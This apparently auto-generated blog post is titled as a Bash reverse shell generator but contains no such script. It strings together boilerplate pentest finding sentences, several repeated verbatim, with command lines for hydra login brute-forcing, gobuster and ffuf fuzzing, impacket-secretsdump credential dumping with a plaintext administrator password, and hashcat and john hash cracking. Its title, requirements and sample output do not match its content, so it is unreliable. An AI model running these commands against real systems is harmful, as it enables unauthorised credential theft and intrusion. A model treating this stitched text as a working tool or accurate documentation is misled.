---
TitleSEO: "Reverse Shell Generator in Bash | ZureFX"
TitlePost: "Reverse Shell Generator — Bash"
Author: "ZureFX"
Description: "A Bash script for reverse shell generator. Built for security research and automation."
Keywords: "go, bash, c, script"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-432.html"
URL_IMAGES: ""
Date: "2024-10-30"
Tags: "Go, Bash, C, Script"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-432"
Permalink: "/scripting/script-reverse-shell-generator-432.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `sharphound`
- `lookupsid`
- `bloodhound`

## Implementation

### Core Logic

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.44.114.38 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.121.29.220/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.105.98.197
```

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.68.16.59 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.118.105.131/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.124.93.221/FUZZ
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.92.45.213/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.24.215.21/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 12.97s
```
